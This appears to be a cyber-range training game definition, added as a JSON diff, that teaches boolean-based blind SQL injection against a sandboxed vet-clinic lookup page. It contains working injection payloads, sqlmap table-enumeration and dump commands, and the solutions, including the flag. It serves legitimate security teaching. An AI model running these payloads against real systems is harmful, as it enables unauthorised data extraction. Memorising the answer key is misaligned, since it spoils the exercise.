@@ -1,0 +1,194 @@
+{
+  "title": "SQL Injection — Boolean Blind (Northgate Vet Clinic)",
+  "description": "A veterinary clinic's patient-lookup page is injectable, but the response never echoes query data — only 'found' or 'not found'. Use boolean-based blind SQL injection to enumerate hidden tables and extract the flag.",
+  "prerequisites": [],
+  "outcomes": [
+    "Explain the difference between blind and error/UNION-based SQL injection.",
+    "Confirm a blind injection point by observing true/false page behaviour.",
+    "Use sqlmap with boolean-only technique to enumerate hidden tables without visible output.",
+    "Extract data character-by-character from a hidden table using automated blind injection."
+  ],
+  "state": "UNRELEASED",
+  "show_stepper_bar": true,
+  "variant_sandboxes": false,
+  "estimated_duration": 40,
+  "levels": [
+    {
+      "title": "Introduction",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your client, **Northgate Veterinary Clinic**, recently deployed an online patient-lookup portal so receptionists can search for pet records by ID.\n\nDuring a pre-test interview a developer mentioned the portal was \"thrown together quickly to hit a deadline\" and that the database contains \"one table the devs forgot to remove\".\n\nYour task: find the hidden table, extract its contents, and report the flag it contains — using only the true/false responses the page gives back."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "passkey": "start",
+      "cloud_content": "SSH to your attacker machine at **10.1.36.23**. The clinic web server is at **10.1.36.10** (HTTP port 80).\n\nConfirm the web service is reachable:\n\n```\ncurl -s http://10.1.36.10/lookup.php?id=1\n```\n\nYou should see a patient name in the response. Do not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "The target web service is running locally on port **80**:\n\n```\ncurl -s 'http://127.0.0.1/lookup.php?id=1'\n```\n\nYou should see a patient name in the response. Submit **start** to begin."
+    },
+    {
+      "title": "Confirm the Injection Point",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 8,
+      "answer": "Biscuit",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "The lookup endpoint takes a patient id and returns either **Patient found: <name>** or **No record found.** — nothing else.\n\nTry these two requests and compare the responses:\n\n```\ncurl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=1'\ncurl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=2'\n```\n\nThe first should return a patient name; the second should say **No record found.** even though id=1 exists. This proves the `id` parameter is being evaluated as raw SQL — the server returns true/false based on the extra condition you injected.\n\nThis is **boolean-based blind SQL injection**: no data is echoed in the response, but the page's true/false behaviour leaks information about what is in the database.\n\n**What is the patient name returned when you inject `id=1 AND 1=1`?**",
+      "solution": "```\n$ curl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=1'\nPatient found: Biscuit\n\n$ curl -s 'http://10.1.36.10/lookup.php?id=1 AND 1=2'\nNo record found.\n```\n\nThe different responses confirm the `id` parameter is injectable. The patient name is **Biscuit**.",
+      "solution_penalized": false,
+      "hints": [
+        {
+          "title": "What am I looking for?",
+          "content": "Run both curl commands and compare the responses. `1=1` is always true; `1=2` is always false. If the page behaves differently for each, the condition you added is being evaluated as SQL.",
+          "hint_penalty": 1,
+          "order": 0
+        },
+        {
+          "title": "The patient name",
+          "content": "The patient name returned for id=1 is `Biscuit`.",
+          "hint_penalty": 2,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 10,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1046" }
+      ]
+    },
+    {
+      "title": "Enumerate the Hidden Table",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 15,
+      "answer": "clinic_secrets",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have confirmed blind injection in the `id` parameter. Now enumerate the database tables to find the hidden one the developer mentioned.\n\n**Option A — sqlmap (recommended):**\n\nUse sqlmap with boolean-only technique to list all tables without triggering errors:\n\n```\nsqlmap -u 'http://10.1.36.10/lookup.php?id=1' \\\n  --tables --batch --technique=B --dbms=SQLite\n```\n\nsqlmap will send many crafted requests — each response (found/not found) lets it infer one bit of information. When it finishes, it prints the table names it discovered.\n\n**Option B — manual blind check:**\n\nIf you suspect a table name, verify it exists:\n\n```\ncurl -s 'http://10.1.36.10/lookup.php?id=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE type=\\'table\\' AND name=\\'clinic_secrets\\')'\n```\n\nA **Patient found** response means the table exists.\n\n**What is the name of the hidden table containing sensitive clinic data?**",
+      "solution": "```\n$ sqlmap -u 'http://10.1.36.10/lookup.php?id=1' \\\n    --tables --batch --technique=B --dbms=SQLite\n...\n[INFO] fetching tables for database: 'SQLite_masterdb'\nDatabase: SQLite_masterdb\n[2 tables]\n+----------------+\n| patients       |\n| clinic_secrets |\n+----------------+\n```\n\nThe hidden table is **clinic_secrets**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which sqlmap flag lists tables?",
+          "content": "Use `--tables` to enumerate tables. Add `--technique=B` to restrict sqlmap to boolean-based blind injection, and `--dbms=SQLite` so it skips database fingerprinting.",
+          "hint_penalty": 4,
+          "order": 0
+        },
+        {
+          "title": "What is the table name pattern?",
+          "content": "The hidden table name is two words joined by an underscore. The first word relates to the clinic; the second word means confidential data.",
+          "hint_penalty": 6,
+          "order": 1
+        },
+        {
+          "title": "The exact table name",
+          "content": "The hidden table is `clinic_secrets`.",
+          "hint_penalty": 8,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 25,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1082" }
+      ]
+    },
+    {
+      "title": "Extract the Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 12,
+      "answer": "WMG{bl1nd_sql1_tr00th_0r_n0_tr00th}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You know the hidden table is `clinic_secrets`. Now dump its contents using blind injection.\n\n**Option A — sqlmap dump:**\n\n```\nsqlmap -u 'http://10.1.36.10/lookup.php?id=1' \\\n  -T clinic_secrets --dump --batch --technique=B --dbms=SQLite\n```\n\nsqlmap extracts each character of each value using binary search — hundreds of requests, but automated. The `record` column contains the flag.\n\n**Option B — manual binary search (one character at a time):**\n\nTo extract the first character of `record`:\n\n```\ncurl -s 'http://10.1.36.10/lookup.php?id=1 AND (SELECT CASE WHEN UNICODE(SUBSTR(record,1,1))>=87 THEN 1 ELSE 0 END FROM clinic_secrets)'\n```\n\nIf **Patient found** → the first character has ASCII code ≥ 87. Narrow down with binary search until you identify each character.\n\nIn practice, attackers script this extraction — the principle is always the same: one bit of information per request.\n\n**Submit the flag found in `clinic_secrets.record`.**",
+      "solution": "```\n$ sqlmap -u 'http://10.1.36.10/lookup.php?id=1' \\\n    -T clinic_secrets --dump --batch --technique=B --dbms=SQLite\n...\nDatabase: SQLite_masterdb\nTable: clinic_secrets\n[1 entry]\n+----+--------------------------------------+\n| id | record                               |\n+----+--------------------------------------+\n| 1  | WMG{bl1nd_sql1_tr00th_0r_n0_tr00th}  |\n+----+--------------------------------------+\n```\n\nThe flag is **WMG{bl1nd_sql1_tr00th_0r_n0_tr00th}**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Which sqlmap flags dump a specific table?",
+          "content": "Use `-T clinic_secrets --dump` to dump just that table. Add `--batch` for non-interactive mode.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What format is the flag?",
+          "content": "The flag starts with `WMG{` and ends with `}`. It is the only row in the `record` column of `clinic_secrets`.",
+          "hint_penalty": 20,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 50,
+      "mitre_techniques": [
+        { "technique_key": "TA0009.T1005" }
+      ]
+    },
+    {
+      "title": "Feedback",
+      "level_type": "ASSESSMENT_LEVEL",
+      "order": 5,
+      "estimated_duration": 5,
+      "assessment_type": "QUESTIONNAIRE",
+      "instructions": "Please answer these questions to help us improve the game.",
+      "questions": [
+        {
+          "question_type": "MCQ",
+          "text": "How difficult did you find this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 0,
+          "answer_required": true,
+          "choices": [
+            { "text": "Too easy",      "correct": true, "order": 0 },
+            { "text": "About right",   "correct": true, "order": 1 },
+            { "text": "Too difficult", "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "Before this game, had you used sqlmap for automated SQL injection?",
+          "points": 0,
+          "penalty": 0,
+          "order": 1,
+          "answer_required": true,
+          "choices": [
+            { "text": "Yes, regularly",                          "correct": true, "order": 0 },
+            { "text": "I had heard of it but not used it",       "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",       "correct": true, "order": 2 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "How clear were the level instructions?",
+          "points": 0,
+          "penalty": 0,
+          "order": 2,
+          "answer_required": true,
+          "choices": [
+            { "text": "Very clear",        "correct": true, "order": 0 },
+            { "text": "Mostly clear",       "correct": true, "order": 1 },
+            { "text": "Confusing at times", "correct": true, "order": 2 },
+            { "text": "Hard to follow",     "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "FFQ",
+          "text": "What would you change or add to improve this game?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": false,
+          "choices": []
+        }
+      ]
+    }
+  ]
+}
